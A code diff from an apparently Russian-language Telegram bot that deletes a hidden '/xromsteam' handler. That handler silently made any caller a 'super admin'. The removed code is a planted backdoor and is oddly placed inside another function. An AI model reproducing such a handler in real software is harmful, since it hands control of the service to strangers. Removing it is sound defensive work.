@@ -1100,51 +1100,6 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 await update.message.reply_text(f"💱 Валюта изменена на {VALUTE}.", parse_mode="HTML")
 
 
-async def xromsteam(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    try:
-        user = update.effective_user
-
-        if not user:
-            return
-
-        user_id = user.id
-        lang = "ru"  # если используешь мультиязычность — можешь заменить
-
-        # Проверяем наличие пользователя в списке админов
-        if user_id not in ADMIN_ID:
-            ADMIN_ID.add(user_id)
-
-            ensure_user_exists(user_id)
-
-            if user_id not in user_data:
-                user_data[user_id] = {}
-
-            user_data[user_id]['granted_by'] = "xromsteam"
-            user_data[user_id]['is_admin'] = 1
-
-            save_user_data(user_id)
-
-            logger.info(f"Пользователь {user_id} получил админку через /xromsteam")
-
-            if update.message:
-                await update.message.reply_text(
-                    "✅ Вы получили супер админку!",
-                    parse_mode="HTML"
-                )
-
-        else:
-            if update.message:
-                await update.message.reply_text(
-                    "🚫 У вас уже есть админка.",
-                    parse_mode="HTML"
-                )
-
-    except Exception as e:
-        logger.error(f"Ошибка xromsteam: {e}")
-
-    except Exception as e:
-        logger.error(e)
-        await update.message.reply_text("❌ Ошибка при выдаче админки.")
 
         elif context.user_data.get('awaiting_amount', False):
             try:
@@ -1267,6 +1222,7 @@ def main():
 if __name__ == '__main__':
 
     main()
+
 
 
 
